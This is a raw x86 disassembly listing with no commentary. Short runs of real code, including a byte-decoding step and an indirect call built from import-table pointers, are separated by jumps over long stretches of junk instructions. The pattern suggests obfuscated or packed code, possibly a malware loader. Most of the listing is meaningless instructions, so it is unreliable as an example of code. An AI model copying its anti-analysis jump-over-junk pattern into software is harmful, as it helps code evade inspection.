  4050f0:	sbb    edx,DWORD PTR [edx]
  4050f2:	inc    ebx
  4050f3:	(bad)  
  4050f5:	loopne 0x405124
  4050f7:	test   eax,0x2d5b21ad
  4050fc:	sbb    dh,0xbb
  4050ff:	fild   WORD PTR [ebp+0x3a]
  405102:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405104:	leave  
  405105:	xor    edi,ebx
  405107:	mov    ebp,0xe7535d2b
  40510c:	div    DWORD PTR [esi+0x4b]
  40510f:	rol    ecx,1
  405111:	xchg   edx,eax
  405112:	xchg   edi,eax
  405113:	jo     0x4050c3
  405115:	mov    ecx,0x5a20cbf9
  40511a:	call   0xd3f29748
  40511f:	popa   
  405120:	pop    ds
  405121:	or     DWORD PTR [esi-0x684cdcc5],edx
  405127:	call   0xb85f:0x7a60d73d
  40512e:	inc    ebx
  40512f:	(bad)  
  405130:	mov    eax,0x36a2db8f
  405135:	pop    ebp
  405136:	call   0x92b:0x29884f65
  40513d:	pop    esi
  40513e:	pop    ds
  40513f:	ror    DWORD PTR [ecx-0x39],1
  405142:	aas    
  405143:	pop    ebp
  405144:	cmp    edi,DWORD PTR [edx+0x71a8c5da]
  40514a:	in     al,0xfc
  40514c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40514d:	out    0xb7,al
  40514f:	cmp    BYTE PTR [eax+0x50896256],ah
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi+0x140f9672]
  4051c5:	sub    esp,DWORD PTR [ecx+0x71]
  4051c8:	dec    edx
  4051c9:	jo     0x405249
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x4051ea
  4051d1:	push   esp
  4051d2:	mov    eax,ds:0xa25fc8bc
  4051d7:	mov    ah,BYTE PTR [ebp+0xc]
  4051da:	and    eax,0x468b15c9
  4051df:	mov    ch,0x3d
  4051e1:	jb     0x4051bc
  4051e3:	dec    edx
  4051e4:	sub    eax,0xf8243a3d
  4051e9:	pusha  
  4051ea:	test   eax,0x3b4246ee
  4051ef:	sub    eax,0xd9389262
  4051f4:	mov    ds:0xe20a742,eax
  4051f9:	out    dx,al
  4051fa:	xor    eax,DWORD PTR [edi]
  4051fc:	sbb    dl,BYTE PTR [edi+0x33]
  4051ff:	add    eax,0x4dfd9c96
  405204:	popa   
  405205:	in     eax,0xae
  405207:	adc    bh,BYTE PTR [edi]
  405209:	lock stos DWORD PTR es:[edi],eax
  40520b:	loope  0x405192
  40520d:	out    dx,eax
  40520e:	imul   esi,DWORD PTR [ecx-0x47],0xa81b51ae
  405215:	xor    BYTE PTR [ecx+0x7b],bl
  405218:	dec    ebp
  405219:	aaa    
  40521a:	rol    esi,1
  40521c:	out    dx,eax
  40521d:	inc    esi
  40521e:	inc    eax
  40521f:	mov    ds:0xe06f66be,eax
  405224:	pop    esp
  405225:	repz (bad) gs:[eiz*4-0x584a4e26]
  40522e:	xchg   edx,eax
  40522f:	push   ebp
  405230:	jmp    0x76a4c5f
  405235:	retf   
  405236:	(bad)  
  405237:	inc    ebp
  405238:	mov    DWORD PTR [ebx+0x7f],edi
  40523b:	push   ecx
  40523c:	jno    0x405265
  40523e:	mov    ebx,0xbd7e8b8b
  405243:	pop    eax
  405244:	dec    ecx
  405245:	in     al,0x1b
  405247:	jecxz  0x405207
  405249:	mov    dh,0x3f
  40524b:	imul   eax,DWORD PTR [edx],0xffffffba
  40524e:	int    0x1d
  405250:	add    bl,BYTE PTR [esi-0x67]
  405253:	popa   
  405254:	scas   al,BYTE PTR es:[edi]
  405255:	pop    ecx
  405256:	fst    DWORD PTR [esi-0x33]
  405259:	test   eax,0x8f5300be
  40525e:	(bad)  
  405260:	aas    
  405261:	sar    DWORD PTR [eax+edx*2-0x18],0xe4
  405266:	adc    DWORD PTR [eax-0x620dbb0e],ecx
  40526c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40526d:	push   ss
  40526e:	mov    ebx,0xcd6636ea
  405273:	lea    edx,[ebx+0x5f]
  405276:	mov    dl,BYTE PTR [edx]
  405278:	jmp    0xeba0:0x210dc44
  40527f:	ja     0x405209
  405281:	cmp    esi,DWORD PTR [edx]
  405283:	cdq    
  405284:	mov    WORD PTR [esi],cs
  405286:	fisttp WORD PTR [esi]
  405288:	rcr    bh,0x86
  40528b:	adc    ch,BYTE PTR [ecx]
  40528d:	int3   
  40528e:	inc    esi
  40528f:	add    edx,DWORD PTR [edx]
  405291:	int3   
  405292:	in     eax,0xa7
  405294:	jmp    0xb590:0x4f9e79a9
  40529b:	mov    bl,0x53
  40529d:	lods   eax,DWORD PTR ds:[esi]
  40529e:	mov    ds:0x3376178,al
  4052a3:	xor    cl,cl
  4052a5:	push   ds
  4052a6:	outs   dx,BYTE PTR ds:[esi]
  4052a7:	or     eax,0x1643fe3c
  4052ac:	ins    BYTE PTR es:[edi],dx
  4052ad:	fadd   st,st(3)
  4052af:	(bad)  
  4052b0:	jns    0x405244
  4052b2:	push   edi
  4052b3:	fwait
  4052b4:	in     al,dx
  4052b5:	in     eax,0x56
  4052b7:	sar    BYTE PTR [ecx],0xa1
  4052ba:	push   ds
  4052bb:	in     eax,0x6e
  4052bd:	push   esp
  4052be:	add    DWORD PTR [esi],0x3
  4052c1:	jmp    0x405249
  4052c3:	(bad)  
  4052c4:	mov    edi,0x6af9c4c4
  4052c9:	cmp    ecx,DWORD PTR ds:0x74a3ed18
  4052cf:	pop    edx
  4052d0:	imul   eax,DWORD PTR [ebp+0x76640335],0x34d56e94
  4052da:	mov    al,ds:0xfd945ac3
  4052df:	sub    ch,dl
  4052e1:	mov    ecx,0x2fffadda
  4052e6:	pushf  
  4052e7:	push   0xffffffc8
  4052e9:	inc    edi
  4052ea:	add    dh,0xf3
  4052ed:	fnsave [ebx+0x367dd07e]
  4052f3:	push   ds
  4052f4:	sbb    BYTE PTR [ecx+0x79],ch
  4052f7:	test   eax,0x37e0a520
  4052fc:	xchg   ebx,eax
  4052fd:	loope  0x405283
  4052ff:	(bad)  
  405300:	aaa    
  405301:	inc    DWORD PTR [ebp+eax*2+0x50ddb960]
  405308:	pop    ss
  405309:	sbb    DWORD PTR [ebp+0x4fb01fc7],edx
  40530f:	mov    al,0x41
  405311:	fwait
  405312:	data16 jnp 0x40535b
  405315:	adc    al,dh
  405317:	imul   ebp,edi,0xffffff86
  40531a:	adc    BYTE PTR ds:[edi+0x411d0223],al
  405321:	lods   eax,DWORD PTR ds:[esi]
  405322:	add    dl,BYTE PTR [esi]
  405324:	xor    dh,BYTE PTR [esi]
  405326:	pusha  
  405327:	sbb    eax,0xade5204c
  40532c:	push   eax
  40532d:	push   DWORD PTR [ebp-0x8]
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	adc    al,0x0
  40534d:	fs sub al,0x16
  405350:	jbe    0x4053d0
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x4053d6
  405358:	adc    al,0xbf
  40535a:	sti    
  40535b:	pop    esp
  40535c:	xchg   ebp,eax
  40535d:	scas   al,BYTE PTR es:[edi]
  40535e:	loop   0x4053bf
  405360:	dec    edi
  405361:	push   edi
  405362:	loop   0x405372
  405364:	xchg   ecx,eax
  405365:	adc    al,0xf
  405367:	hlt    
  405368:	mov    ds:0xbefb47b6,al
  40536d:	and    BYTE PTR [edx-0x59af879a],ah
  405373:	dec    ebx
  405374:	(bad)  
  405375:	mov    edx,0xa939d3f3
  40537a:	gs rcl ah,1
  40537d:	mov    ecx,0x2d8768dd
  405382:	add    ah,dh
  405384:	cdq    
  405385:	mov    ebx,DWORD PTR [eax+0x309facb4]
  40538b:	jno    0x405376
  40538d:	imul   ebp,DWORD PTR [edx+0x32a6d845],0x5c8414b7
  405397:	dec    edi
  405398:	cdq    
  405399:	xor    esp,DWORD PTR [edi]
  40539b:	dec    esp
  40539c:	adc    DWORD PTR [eax+0x1],ebp
  40539f:	daa    
  4053a0:	push   cs
  4053a1:	mov    al,0xcb
  4053a3:	arpl   si,di
  4053a5:	sub    eax,0x4d160a26
  4053aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053ab:	sub    BYTE PTR [ebp-0x70],cl
  4053ae:	mov    cl,0x8b
  4053b0:	inc    BYTE PTR [ecx]
  4053b2:	mov    dh,0x44
  4053b4:	push   edi
  4053b5:	mov    al,ds:0x88f44621
  4053ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053bb:	aas    
  4053bc:	or     ch,dl
  4053be:	icebp  
  4053bf:	ds jge 0x405423
  4053c2:	leave  
  4053c3:	aad    0xc7
  4053c5:	sar    ah,1
  4053c7:	push   edx
  4053c8:	cmp    DWORD PTR [eax+eiz*4+0x38736b85],ebp
  4053cf:	rcl    esp,cl
  4053d1:	sub    BYTE PTR [ebx],dh
  4053d3:	sub    ebx,DWORD PTR [ecx-0x6a]
  4053d6:	shr    BYTE PTR [esi+edi*1],1
  4053d9:	sub    DWORD PTR [eax+ebp*4],0xffffffa5
  4053dd:	(bad)
  4053e2:	xchg   ecx,eax
  4053e3:	push   ds
  4053e4:	adc    eax,0xb467eb33
  4053e9:	mov    dl,0x0
  4053eb:	sub    eax,0xa963d5b9
  4053f0:	add    eax,DWORD PTR [ebx]
  4053f2:	dec    eax
  4053f3:	scas   al,BYTE PTR es:[edi]
  4053f4:	or     edi,DWORD PTR [ebx]
  4053f6:	and    dl,BYTE PTR [edx+0x4cd5645]
  4053fc:	pop    edx
  4053fd:	ror    BYTE PTR [eax],cl
  4053ff:	lds    esp,FWORD PTR [esi+eax*2+0x33]
  405403:	add    dh,BYTE PTR [ecx]
  405405:	sub    BYTE PTR [edx-0x3b],0x35
  405409:	aas    
  40540a:	cld    
  40540b:	adc    eax,ebx
  40540d:	and    eax,0xac58561f
  405412:	xchg   ecx,eax
  405413:	je     0x40542e
  405415:	retf   0x6534
  405418:	jo     0x405494
  40541a:	mov    edx,0x6cd44299
  40541f:	push   ebp
  405420:	fdivr  DWORD PTR [ebp-0x71]
  405423:	sub    DWORD PTR [eax],edx
  405425:	test   BYTE PTR [eax+0x5bfa525b],al
  40542b:	jne    0x405454
  40542d:	in     eax,0x29
  40542f:	mov    esp,0xdcd75082
  405434:	mov    dh,0xab
  405436:	fidiv  DWORD PTR [edx-0x44]
  405439:	xor    al,BYTE PTR [eax]
  40543b:	(bad)  
  40543c:	outs   dx,DWORD PTR ds:[esi]
  40543d:	es pop ebx
  40543f:	push   edx
  405440:	repz xor eax,0x99a993ae
  405446:	in     al,dx
  405447:	enter  0x523d,0x61
  40544b:	inc    edi
  40544c:	cs push ds
  40544e:	pop    ebp
  40544f:	xor    eax,0x8203d3be
  405454:	sub    ecx,DWORD PTR [edi+0x11940cec]
  40545a:	loop   0x405459
  40545c:	std    
  40545d:	repz ret 
  40545f:	xchg   ebx,eax
  405460:	dec    ebp
  405461:	(bad)  
  405462:	in     eax,0xdb
  405464:	xlat   BYTE PTR ds:[ebx]
  405465:	adc    DWORD PTR [ecx+0x3a80f995],eax
  40546b:	imul   ebx,DWORD PTR [esi*2-0x113a5d10],0x43
  405473:	push   edi
  405474:	ins    DWORD PTR es:[edi],dx
  405475:	cld    
  405476:	cmp    ch,BYTE PTR [ebx+ebp*2+0x60]
  40547a:	lods   al,BYTE PTR ds:[esi]
  40547b:	mov    edi,0xc9d51073
  405480:	in     eax,0xa2
  405482:	test   BYTE PTR [esi+ebx*8],bh
  405485:	stos   DWORD PTR es:[edi],eax
  405486:	inc    edx
  405487:	mov    eax,ds:0x52a6dbb4
  40548c:	ds cmp eax,0x60e7a972
  405492:	jl     0x405439
  405494:	int3   
  405495:	pusha  
  405496:	xor    eax,0x80231050
  40549b:	sahf   
  40549c:	sub    bh,BYTE PTR [esi+0x3937787d]
  4054a2:	stc    
  4054a3:	mov    al,0x15
  4054a5:	fldenv [ecx-0x54e97153]
  4054ac:	mov    edx,0xc99463ae
  4054b1:	in     eax,0x59
  4054b3:	call   0x409607
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi+0x53],0xffffffea
  40550f:	leave  
  405510:	adc    eax,0x7e7e77f2
  405515:	fidivr DWORD PTR [edi+0x7e]
  405518:	jle    0x4054e9
  40551a:	dec    eax
  40551b:	mov    ds:0x897eddad,eax
  405520:	push   eax
  405521:	das    
  405522:	push   eax
  405523:	mov    edi,0x60c19be6
  405528:	(bad)  
  40552a:	ss stos BYTE PTR es:[edi],al
  40552c:	ret    0xd7d1
  40552f:	pop    ebp
  405530:	ret    0xa6f9
  405533:	mov    al,0x27
  405535:	sbb    al,0x5b
  405537:	xchg   ebx,eax
  405538:	adc    al,0x9a
  40553a:	jne    0x405546
  40553c:	dec    ebx
  40553d:	inc    ebp
  40553e:	or     al,0x1e
  405540:	(bad)  
  405541:	lods   eax,DWORD PTR ds:[esi]
  405542:	xchg   edi,eax
  405543:	sub    eax,0x9191d267
  405548:	mov    dh,0xb8
  40554a:	push   0x20
  40554c:	sub    eax,0x56c83466
  405551:	jmp    0xba7d2edc
  405556:	das    
  405557:	and    al,0x4c
  405559:	push   ebp
  40555a:	lods   eax,DWORD PTR ds:[esi]
  40555b:	ret    0xb95d
  40555e:	xchg   ecx,eax
  40555f:	popf   
  405560:	adc    al,0xd7
  405562:	mov    edi,0x1d04d4e5
  405567:	ds jg  0x405558
  40556a:	(bad)  
  40556b:	in     eax,0x43
  40556d:	sub    bh,ch
  40556f:	out    dx,al
  405570:	test   al,0x58
  405572:	mov    fs,WORD PTR [ecx+0x4f71fda6]
  405578:	xchg   ecx,eax
  405579:	hlt    
  40557a:	mov    esp,0x803227bd
  40557f:	mov    edx,0xe30a11ea
  405584:	rol    DWORD PTR [edx+0x28fa5b5d],0x4e
  40558b:	stos   BYTE PTR es:[edi],al
  40558c:	mov    edi,0xb45c23df
  405591:	int    0x88
  405593:	mov    ebp,0xd8f9044a
  405598:	adc    eax,ebx
  40559a:	mov    ds:0xe53d62a3,al
  40559f:	nop
  4055a0:	dec    ebp
  4055a1:	dec    esp
  4055a2:	inc    esi
  4055a3:	dec    edi
  4055a4:	push   ecx
  4055a5:	jno    0x40560e
  4055a7:	push   eax
  4055a8:	fild   QWORD PTR [ebx-0x3f]
  4055ab:	and    DWORD PTR [edi+0x1a044796],esi
  4055b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b2:	scas   al,BYTE PTR es:[edi]
  4055b3:	por    mm2,QWORD PTR [ecx]
  4055b6:	bound  esp,QWORD PTR [edx-0x5c23b4fb]
  4055bc:	jg     0x4055ac
  4055be:	mov    edx,0xfde1cbaf
  4055c3:	and    BYTE PTR [esi-0x43e26ffe],ch
  4055c9:	inc    edx
  4055ca:	jecxz  0x40555f
  4055cc:	daa    
  4055cd:	push   esp
  4055ce:	mov    bh,0xa5
  4055d0:	or     esi,DWORD PTR [esi+eax*4+0x1e]
  4055d4:	(bad)  
  4055d5:	push   ds
  4055d6:	mov    al,ds:0xb8ce219d
  4055db:	(bad)  
  4055dc:	sti    
  4055dd:	out    0xa9,al
  4055df:	push   ebp
  4055e0:	scas   al,BYTE PTR es:[edi]
  4055e1:	xchg   BYTE PTR [edi],ah
  4055e3:	sub    eax,0x2c76b486
  4055e8:	pop    ds
  4055e9:	xchg   DWORD PTR [edx],esp
  4055eb:	or     eax,DWORD PTR [eax+0x41]
  4055ee:	jg     0x405587
  4055f0:	adc    BYTE PTR [eax],al
  4055f2:	mov    eax,0x1b45a5c2
  4055f7:	daa    
  4055f8:	fwait
  4055f9:	dec    edx
  4055fa:	ror    DWORD PTR [edi-0x15],cl
  4055fd:	xchg   BYTE PTR [eax+edx*2],dl
  405600:	inc    ebx
  405601:	ja     0x405592
  405603:	cwde   
  405604:	dec    ecx
  405605:	dec    edi
  405606:	popa   
  405607:	sub    esi,DWORD PTR [edx]
  405609:	outs   dx,BYTE PTR ds:[esi]
  40560a:	push   0xfffffffe
  40560c:	in     eax,0xa
  40560e:	xor    DWORD PTR [eax+0x27971eb1],0xf241c38d
  405618:	retf   0x32d2
  40561b:	push   cs
  40561c:	cmp    BYTE PTR [esi],al
  40561e:	hlt    
  40561f:	xchg   ebp,eax
  405620:	arpl   WORD PTR [esi],cx
  405622:	xchg   esi,eax
  405623:	adc    BYTE PTR [ebp+0x6d28781a],dh
  405629:	xchg   esi,eax
  40562a:	ds out dx,al
  40562c:	push   eax
  40562d:	in     al,dx
  40562e:	mul    BYTE PTR [edx+0x2b]
  405631:	or     ebx,DWORD PTR [esi-0x6fbc6e46]
  405637:	mov    WORD PTR [ebx-0x4c],?
  40563a:	sbb    DWORD PTR [edi],0x5f0f70e
  405640:	dec    ebx
  405641:	mov    ds:0x719ffe2f,eax
  405646:	iret   
  405647:	sbb    eax,0xa1b06d6c
  40564c:	fnsave [ebx-0x5a76e079]
  405652:	fs pop es
  405654:	xchg   esp,eax
  405655:	xor    al,0x6d
  405657:	pop    ecx
  405658:	and    BYTE PTR [edx+0x9969966],0x70
  40565f:	popf   
  405660:	dec    edx
  405661:	sub    al,0x81
  405663:	dec    ebp
  405664:	cmp    BYTE PTR [ebx-0xa2fafcf],bl
  40566a:	add    BYTE PTR [ebx-0x40],bl
  40566d:	test   ebx,eax
  40566f:	shl    ch,cl
  405671:	ret    0x9f0e
  405674:	ins    DWORD PTR es:[edi],dx
  405675:	mov    DWORD PTR [eax+0x1],ecx
  405678:	mov    al,BYTE PTR [ebp-0x1]
  40567b:	mov    ecx,DWORD PTR [ebp-0x8]
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	mov    esi,0x5e9228b0
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x40570c
  4056ad:	inc    esi
  4056ae:	mov    ?,ebp
  4056b0:	lds    edi,FWORD PTR [ecx+0x6b710a03]
  4056b6:	dec    edx
  4056b7:	sbb    eax,0x20889b67
  4056bc:	jecxz  0x405691
  4056be:	adc    BYTE PTR [edi+eax*2+0x16],0xa2
  4056c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c4:	lock mov ds:0x20daa96d,al
  4056ca:	sbb    al,0xc0
  4056cc:	(bad)  
  4056cd:	cmc    
  4056ce:	fcomp  DWORD PTR [edi]
  4056d0:	jnp    0x405680
  4056d2:	popf   
  4056d3:	test   al,0x4a
  4056d5:	rcr    DWORD PTR [eax-0x39],0x31
  4056d9:	sbb    al,0x31
  4056db:	fild   DWORD PTR [edi+0xcef1ae2]
  4056e1:	scas   al,BYTE PTR es:[edi]
  4056e2:	jbe    0x40566a
  4056e4:	ins    DWORD PTR es:[edi],dx
  4056e5:	inc    esi
  4056e6:	lds    esp,FWORD PTR [ecx]
  4056e8:	mov    dh,0x52
  4056ea:	inc    ebx
  4056eb:	add    eax,0x2cc61508
  4056f0:	stc    
  4056f1:	mov    ebx,0x2f499f93
  4056f6:	mov    al,ds:0x45a677f1
  4056fb:	and    DWORD PTR ds:0x5e565c16,ebx
  405701:	add    eax,0x750481a3
  405706:	jmp    0xdabdc00d
  40570b:	sbb    al,BYTE PTR [ebp-0x1c]
  40570e:	jo     0x405781
  405710:	lods   eax,DWORD PTR ds:[esi]
  405711:	cwde   
  405712:	pop    es
  405713:	sbb    edx,eax
  405715:	cmp    ch,dh
  405717:	xor    BYTE PTR [ecx],dh
  405719:	inc    eax
  40571a:	je     0x405749
  40571c:	mov    ds,ebp
  40571e:	sub    DWORD PTR [eax-0x61e592d9],esi
  405724:	imul   eax,DWORD PTR [eax+0x5704645],0xffffffa6
  40572b:	imul   eax,DWORD PTR [ebp+0x6eb46c37],0xac0baed7
  405735:	pop    ecx
  405736:	hlt    
  405737:	rcr    BYTE PTR [esi-0x64cb4add],1
  40573d:	test   DWORD PTR [ebp-0x48],eax
  405740:	jge    0x40573a
  405742:	mov    esi,0x5f88f87a
  405747:	inc    esi
  405748:	mov    ds:0xfd489305,eax
  40574d:	mov    bl,0xc
  40574f:	aaa    
  405750:	js     0x40575b
  405752:	cwde   
  405753:	aas    
  405754:	add    DWORD PTR [ecx-0x18e59dbb],0x15
  40575b:	and    eax,0x79d17dd6
  405760:	popf   
  405761:	xor    BYTE PTR [edx],ah
  405763:	and    BYTE PTR [edi-0x43],dh
  405766:	fs test al,0x59
  405769:	or     ch,bl
  40576b:	or     edx,DWORD PTR [edx-0x56]
  40576e:	mov    esi,0x7b6382eb
  405773:	dec    esi
  405774:	lods   al,BYTE PTR ds:[esi]
  405775:	outs   dx,BYTE PTR ds:[esi]
  405776:	cli    
  405777:	sub    al,0x7a
  405779:	out    dx,al
  40577a:	lahf   
  40577b:	mov    edx,0x37f1b381
  405780:	sub    al,0x7
  405782:	adc    BYTE PTR [ecx+0x7c872711],dl
  405788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405789:	arpl   WORD PTR [esi],si
  40578b:	shl    esi,cl
  40578d:	iret   
  40578e:	fsub   QWORD PTR [edx]
  405790:	in     eax,0xb7
  405792:	jcxz   0x405804
  405795:	cmp    BYTE PTR ss:[ecx+0x18],cl
  405799:	mov    ebp,0xd0fc8159
  40579e:	push   edi
  40579f:	enter  0x68c8,0xc5
  4057a3:	sbb    BYTE PTR [eax-0x4d8eb0fa],bl
  4057a9:	push   eax
  4057aa:	xor    eax,0x2abe562e
  4057af:	pop    ss
  4057b0:	inc    eax
  4057b1:	fistp  QWORD PTR [edx+0x39]
  4057b4:	push   0x523122b2
  4057b9:	inc    edi
  4057ba:	jp     0x40576b
  4057bc:	cmp    BYTE PTR [ebx-0x35],dl
  4057bf:	add    eax,0x799155eb
  4057c4:	idiv   edx
  4057c6:	(bad)  
  4057c7:	pop    esi
  4057c8:	inc    ebx
  4057c9:	xor    bh,BYTE PTR [edi-0x6a]
  4057cc:	fs pop ebx
  4057ce:	cmp    DWORD PTR [eax-0x1d],ebp
  4057d1:	fsub   QWORD PTR [ecx]
  4057d3:	out    dx,eax
  4057d4:	in     eax,0xec
  4057d6:	call   0xacd92893
  4057db:	movhps xmm0,QWORD PTR [ecx-0x53b1fbfd]
  4057e2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e4:	push   ecx
  4057e5:	or     DWORD PTR ds:0x9dfb4c7b,0xffffffd5
  4057ec:	fs xchg ecx,eax
  4057ee:	repz dec esp
  4057f0:	mov    al,0xa3
  4057f2:	les    ebp,FWORD PTR [ecx-0x7c]
  4057f5:	jae    0x4057c3
  4057f7:	loope  0x4057b1
  4057f9:	mov    BYTE PTR [eax],0x12
  4057fc:	lea    edx,[edi-0x4cc74d0a]
  405802:	or     al,0x66
  405804:	lock and eax,0xafe14f1
  40580a:	push   DWORD PTR [ebp-0x10]
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	leave  
  405857:	dec    edx
  405858:	imul   edi,DWORD PTR [edi+0x3a],0xda7e7e0a
  40585f:	jg     0x4058df
  405861:	jle    0x405892
  405863:	repz js 0x405825
  405866:	push   edi
  405867:	data16 loope 0x40589f
  40586a:	add    eax,0x55abd3c0
  40586f:	jb     0x40584e
  405871:	inc    edi
  405872:	sar    BYTE PTR [esi-0xb],0x93
  405876:	jle    0x4058a9
  405878:	ins    DWORD PTR es:[edi],dx
  405879:	popf   
  40587a:	mov    esp,0x750bec6e
  40587f:	jge    0x40589d
  405881:	(bad)  
  405882:	jne    0x4058f8
  405884:	fwait
  405885:	in     eax,dx
  405886:	jnp    0x405849
  405888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405889:	lods   al,BYTE PTR ds:[esi]
  40588a:	inc    esp
  40588b:	mov    dl,0x16
  40588d:	sub    eax,0xa1d1c29e
  405892:	cmp    bl,BYTE PTR [eax+0x1b]
  405895:	or     ecx,ebx
  405897:	xor    BYTE PTR ds:0x70b0803,al
  40589d:	push   ecx
  40589e:	pop    es
  40589f:	mov    bl,0x63
  4058a1:	xchg   edi,eax
  4058a2:	imul   ecx,edi,0xffffffe3
  4058a5:	es or  al,0x5f
  4058a8:	cmp    BYTE PTR [eax+0x3d],dl
  4058ab:	fbstp  TBYTE PTR [esi-0x434e79ff]
  4058b1:	add    eax,DWORD PTR ds:0x4d6603a3
  4058b7:	out    0xc5,eax
  4058b9:	loopne 0x405884
  4058bb:	push   ebp
  4058bc:	repnz retf 
  4058be:	jmp    0x405931
  4058c0:	add    dl,cl
  4058c2:	outs   dx,WORD PTR ds:[esi]
  4058c4:	repz pop esi
  4058c6:	cli    
  4058c7:	and    DWORD PTR [ecx],ebp
  4058c9:	jge    0x405900
  4058cb:	bound  edi,QWORD PTR [edx+0x64]
  4058ce:	adc    dh,BYTE PTR [eax]
  4058d0:	and    ah,BYTE PTR [esi-0x591fb0fc]
  4058d6:	push   ebp
  4058d7:	scas   al,BYTE PTR es:[edi]
  4058d8:	(bad)  
  4058da:	jbe    0x4058fa
  4058dc:	cmp    eax,0xa613286e
  4058e1:	ins    BYTE PTR es:[edi],dx
  4058e2:	test   esi,ebp
  4058e4:	xor    ebx,DWORD PTR [esi]
  4058e6:	xor    al,0xa7
  4058e8:	dec    ecx
  4058e9:	ins    DWORD PTR es:[edi],dx
  4058ea:	adc    BYTE PTR [eax+0x41],bh
  4058ed:	scas   al,BYTE PTR es:[edi]
  4058ee:	mov    DWORD PTR [eax-0x54],edi
  4058f1:	shr    DWORD PTR [ebx],1
  4058f3:	push   ss
  4058f4:	inc    edx
  4058f5:	pop    ebx
  4058f6:	jns    0x40587e
  4058f8:	sbb    al,0x70
  4058fa:	push   DWORD PTR [esi+ebx*1-0x59b270e4]
  405901:	push   0x1
  405903:	sbb    DWORD PTR [eax+0x25c35c00],ebp
  405909:	mov    al,0x4b
  40590b:	mov    BYTE PTR [eax-0x63],cl
  40590e:	ror    BYTE PTR [edi],1
  405910:	push   ds
  405911:	loope  0x4058b4
  405913:	fwait
  405914:	(bad)  
  405915:	pop    ebp
  405916:	std    
  405917:	inc    esi
  405918:	xchg   esi,eax
  405919:	mov    ebp,0x7dd2001c
  40591e:	sbb    eax,0xa1820f71
  405923:	(bad)  
